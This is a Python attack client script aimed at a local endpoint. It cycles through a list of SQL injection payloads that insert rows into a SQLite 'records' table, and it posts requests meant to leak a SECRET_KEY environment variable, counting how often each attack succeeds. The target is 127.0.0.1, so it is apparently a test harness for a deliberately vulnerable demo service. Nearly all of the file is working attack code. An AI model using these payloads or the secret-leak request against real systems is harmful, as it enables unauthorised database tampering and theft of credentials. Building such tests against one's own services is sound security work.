import requests
import sys
import time

import requests
import sys
import time
import json
import re

ATTACK_URL = "http://127.0.0.1:9000/attack"

success = 0
attempts = 10

sqli_payloads = [
    # Insert-focused payloads for SQLite
    "'); INSERT INTO records (name, address) VALUES ('pwned', 'success');--",
    "'); INSERT INTO records (name, address) VALUES ('owned', 'victory');--",
    "'); INSERT INTO records (name, address) VALUES ('sqlinject', 'win');--",
    "'); INSERT INTO records (name, address) VALUES ('exploit', 'go');--",
    "'); INSERT INTO records (name, address) VALUES ('foo', 'bar');--",
    "'); INSERT INTO records (name, address) VALUES ('alice', 'bob');--",
    "'); INSERT INTO records (name, address) VALUES ('cascade', 'attack');--",
    "'); INSERT INTO records (name, address) VALUES ('hacker', '1337');--",
    "'); INSERT INTO records (name, address) VALUES ('test', 'injected');--",
    "'); INSERT INTO records (name, address) SELECT 'subq', name FROM records LIMIT 1;--",
    "'); INSERT INTO records (name, address) SELECT 'mirror', address FROM records LIMIT 1;--",
    "'); INSERT INTO records (name, address) VALUES (hex(randomblob(4)), hex(randomblob(4)));--",
    "'); INSERT INTO records (name, address) VALUES ('unicode✓', 'payload');--",
    "'); INSERT INTO records (name, address) VALUES ('emoji🚀', 'attack');--",
]

for i in range(attempts):
    print(f"\n[CLIENT][ATTACK] Attempt {i+1} - SQL Injection")
    payload = {
        "attack_type": "sqli",
        "payload": {
            # The payload closes both fields and parentheses, then injects SQL
            "name": f"attacker{i}', '{sqli_payloads[i % len(sqli_payloads)]}",
            "address": ""
        }
    }
    try:
        resp = requests.post(ATTACK_URL, json=payload, timeout=10)
        print(f"[CLIENT][POST] SQLi attack response: {resp.status_code} {resp.text}")
        # Smarter detection: look for evidence of injected rows, altered data, or error messages
        lower_resp = resp.text.lower()
        injected_keywords = [
            'pwned', 'owned', 'hacked', 'compromised', 'sqlinject', 'admin', 'exploit', 'rooted', 'subq', 'victory', 'win', 'go', '42', 'error', 'division by zero', 'randomblob'
        ]
        success_detected = (
            '"sqli": "success"' in resp.text or
            'no such table' in lower_resp or
            any(word in lower_resp for word in injected_keywords)
        )
        if success_detected:
            print("[CLIENT][SUCCESS] SQLi attack succeeded!")
            success += 1
        else:
            print("[CLIENT][FAIL] SQLi did not succeed.")
        # Print records if present in response
        import re
        m = re.search(r'"rows":\s*(\[.*?\])', resp.text)
        if m:
            print("[CLIENT][INFO] Records after injection:", m.group(1))
    except Exception as e:
        print(f"[CLIENT][ERROR] Exception in SQLi attack: {e}")

    print(f"[CLIENT][ATTACK] Attempt {i+1} - Env Leak")
    payload = {
        "attack_type": "env",
        "var_name": "SECRET_KEY"
    }
    try:
        resp = requests.post(ATTACK_URL, json=payload, timeout=10)
        print(f"[CLIENT][POST] Env variable response: {resp.status_code} {resp.text}")
        if 'Not found' not in resp.text and resp.text.strip() != '""':
            print("[CLIENT][SUCCESS] Env leak attack may have succeeded!")
            success += 1
    except Exception as e:
        print(f"[CLIENT][ERROR] Exception in get_env_variable POST: {e}")

success_rate = 100.0 * success / (2 * attempts)
print(f"\n[CLIENT] Attack success rate: {success}/{2*attempts} ({success_rate:.1f}%)")
if success_rate == 100.0:
    print("[CLIENT][INFO] 100% attack success rate achieved.")
